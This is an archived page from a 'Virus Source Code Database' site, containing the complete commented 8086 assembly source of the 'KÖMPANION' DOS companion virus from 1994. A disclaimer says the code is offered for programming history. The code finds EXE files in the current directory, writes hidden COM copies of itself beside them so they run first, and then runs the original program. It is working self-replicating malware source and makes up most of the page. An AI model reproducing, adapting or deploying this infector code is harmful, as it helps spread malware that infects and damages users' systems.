<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: kompanio_asm</title>
<meta name="KEYWORDS" content="kompanio.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for kompanio.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="kali-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kali-4_asm.php">kali-4_asm</a><br>
<a href="kaoshide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kaoshide_asm.php">kaoshide_asm</a><br>
<a href="k_cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k_cmos_asm.php">k_cmos_asm</a><br>
<a href="k-cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k-cmos_asm.php">k-cmos_asm</a><br>
<a href="keepacid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepacid_asm.php">keepacid_asm</a><br>
<a href="keepenem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepenem_asm.php">keepenem_asm</a><br>
<a href="keykap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykap_asm.php">keykap_asm</a><br>
<a href="keykapt2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykapt2_asm.php">keykapt2_asm</a><br>
<a href="keypress_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keypress_asm.php">keypress_asm</a><br>
<a href="kiis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kiis_asm.php">kiis_asm</a><br>
<a href="kildia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kildia_asm.php">kildia_asm</a><br>
<a href="kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_asm.php">kill_asm</a><br>
<a href="kill_br_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_br_asm.php">kill_br_asm</a><br>
<a href="kill_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_rep_asm.php">kill_rep_asm</a><br>
<a href="kinison__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison__asm.php">kinison__asm</a><br>
<a href="kinison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison_asm.php">kinison_asm</a><br>
<a href="kinniso__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinniso__asm.php">kinniso__asm</a><br>
<a href="kinnison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinnison_asm.php">kinnison_asm</a><br>
<a href="kinsn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinsn_asm.php">kinsn_asm</a><br>
<a href="kk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kk2_asm.php">kk2_asm</a><br>
<a href="kod4_129_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_129_asm.php">kod4_129_asm</a><br>
<a href="kod4_399_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_399_asm.php">kod4_399_asm</a><br>
<a href="kode4-1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-1__asm.php">kode4-1__asm</a><br>
<a href="kode4-2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-2__asm.php">kode4-2__asm</a><br>
<a href="kohn_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_6_asm.php">kohn_6_asm</a><br>
<a href="kohn_9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_9_asm.php">kohn_9_asm</a><br>
<a href="kompanio_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kompanio_asm.php">kompanio_asm</a><br>
<a href="krad_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krad_pas.php">krad_pas</a><br>
<a href="krtt41_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krtt41_asm.php">krtt41_asm</a><br>
<a href="krttdemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krttdemo_asm.php">krttdemo_asm</a><br>
<a href="kstest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kstest_asm.php">kstest_asm</a><br>
<a href="ksvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/ksvir_asm.php">ksvir_asm</a><br>
<a href="kuku_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kuku_bas.php">kuku_bas</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;*****************************************************************************
;                             K”MPANION VIRUS
;
; AUTHOR:  K”hntark 
; DATE:    FEBRUARY 1994
; EXE infector companion virus
;
; File Type: COM
; Processor: 8086/88
; Size: 270 bytes
; Memory Needed:     1 Kb
; Subroutines:    2
;*****************************************************************************
 

CSEG            SEGMENT BYTE
                ASSUME cs:CSEG,ds:CSEG,ss:CSEG  ;< cs = ss = ds = es >
                ORG     100h

FILESIZE        equ     offset THY_END - offset MAIN

MAIN:
                jmp     short START             ;ds:0100 

;-----------------------------------------------------------------------------

EXE_MASK:       db      '*.EXE'                 ;ds:0102 
COM_MASK        db      'COM',0                 ;ds:0107 

DTA             db      43d dup (00h)           ;ds:010b
FILENAME        db      13d dup ('?')           ;ds:0136 

                                                ;parameter block
PSP_SEG         dw      0000                    ;ds:0143 segment address of environment string 
                
                dw      0080h
PAR_BLK1        dw      0000                    ;ds:0147 ptr to command line to be placed at PSP + 80h

                dw      005Ch
PAR_BLK2        dw      0000                    ;ds:014b ptr to default PSP + 5Ch

                dw      006Ch
PAR_BLK3        dw      0000                    ;ds:014f ptr to default PSP + 6Ch

FILEHANDLE      dd      00                      ;ds:0151

;---------------------->>>> starts execution here <<<<------------------------

START:

;*************************************************                
; Modify Allocated memory blocks / Shrink memory
;*************************************************
                
                mov     bx,0050h                ;bx = # of paragraphs = 1280 bytes
                mov     ah,4Ah                  ;function 4Ah
                int     21h                     ;set mem block ES:0000

;************************************                
; Store segments for parameter block
;************************************

                mov     ax,word ptr cs:002Ch    ;psp_envir segment => ax
                mov     word ptr PSP_SEG,ax     ;store PSP segment
                
                mov     word ptr PAR_BLK1,cs    ;store CS 
                mov     word ptr PAR_BLK2,cs    ;store CS 
                mov     word ptr PAR_BLK3,cs    ;store CS 
                
                call    EXECUTE                 ;execute program
                
;*********************************                
; Shift DTA Down
;*********************************
                
                mov     byte ptr DTA,00         ;0 in first DTA byte 
                mov     si,offset DTA           ;move from DS:SI
                mov     di,offset DTA + 1       ;move to ES:DI
                mov     cx,002Bh                ;# of bytes to move  = 43
                cld                             ;Forward String Opers
                repz    movsb                   ;Mov DS:[SI]->ES:[DI]

;*********************************                
; Set DTA
;*********************************
                
                mov     ah,1Ah                  ;set DTA function
                mov     dx,offset DTA           ;set DTA to DS:DX
                int     21h                     ;set dta  DS:DX=dta addr

;*********************************                
; Find 1st EXE file to infect
;*********************************
                
                mov     ah,4Eh                  ;find 1st file function
                xor     cx,cx                   ;cx = 0 all attributes
                mov     dx,offset EXE_MASK      ;dx = file mask
                int     21h                     ;srch for 1st, DS:DX=path
                jb      EXIT                    ;exit if no file found

;********************                
; Move filename
;********************

AGAIN:          mov     si,0129h                ;move filename from DTA
                mov     di,offset FILENAME      ;move to FILENAME location
                mov     cx,000Ch                ;move 12 bytes
                cld                             ;Forward String Opers
                repz    movsb                   ;Mov DS:[SI]->ES:[DI]

;*****************************************                
; Find dot (filename extension separator)
;*****************************************

                mov     bx,001Dh                ;original index
FIND_DOT:       inc     bx                      ;increase index
                cmp     byte ptr DTA[bx],2Eh    ;2Eh = '.'
                jne     FIND_DOT                ;Jump not equal(ZF=0)

;****************************************                
; Mov COM extension to filename
;****************************************
                
                mov     si,offset COM_MASK      ;si = source 'COM0' offset
                inc     bx                      ;fix index 
                lea     di,word ptr DTA[bx]     ;di = destination
                mov     cx,0004h                ;cx=4 bytes
                cld                             ;Forward String Opers
                repz    movsb                   ;Mov DS:[SI]->ES:[DI]

;*****************************                
; Create companion COM file
;*****************************
                
                mov     dx,0129h                ;dx DTA COM filename offset
                call    CREATE_COMPANION        ;call subroutine
                
;*********************************                
; Find next EXE file to infect
;*********************************
                
                mov     ah,4Fh                  ;search for next file function
                int     21h                     ;search for next
                jnb     AGAIN                   ;do it again

EXIT:           retn                            ;return to caller

NAME_AUTHOR     db      'K”MPANION / K”hntark'

;-----------------------------------------------------------------------------
;****************************
; CREATE COMPANION COM FILE
;****************************
 
CREATE_COMPANION        PROC NEAR               
                
;*********************
; Create COM file
;*********************
                
                mov     ah,3Ch                  ;create file function 
                mov     cx,0002h                ;cx = attributes = hidden 
                int     21h                     ;create file, DS:DX=name
                jb      OH_NO                   ;Jump if <  (no sign)

;***********************************
; Write virus to companion COM file
;***********************************
                
                mov     word ptr FILEHANDLE,ax  ;store file handle
                push    dx                      ;save filename offset
                mov     bx,word ptr FILEHANDLE  ;bx = file handle
                mov     cx,FILESIZE             ;cx=# bytes to write
                mov     dx,0100h                ;write from DS:0100h
                mov     ah,40h                  ;write to file function
                int     21h                     ;write file, BX=handle

;***************
; Close file
;***************
                
                pop     dx                      ;restore filename offset
                mov     bx,word ptr FILEHANDLE  ;bx=file handle
                mov     ah,3Eh                  ;close file function
                int     21h                     ;close file, BX=handle
OH_NO:          retn                            ;return to 0000 => int 20h in PSP

CREATE_COMPANION        ENDP
 
;-----------------------------------------------------------------------------
;****************************
; Execute EXE program
;****************************

EXECUTE         PROC NEAR                        
                
                mov     dx,offset FILENAME      ;stored EXE program name at ES:DX
                mov     bx,offset PSP_SEG       ;parameter block at ES:BX
                mov     ax,4B00h                ;load & execute program function
                int     21h                     ;execute prog.
                retn                            ;return to caller

EXECUTE         ENDP

;-----------------------------------------------------------------------------

THY_END:

CSEG            ENDS
 
                END     MAIN
 

</textarea></td></tr></table></body></html>
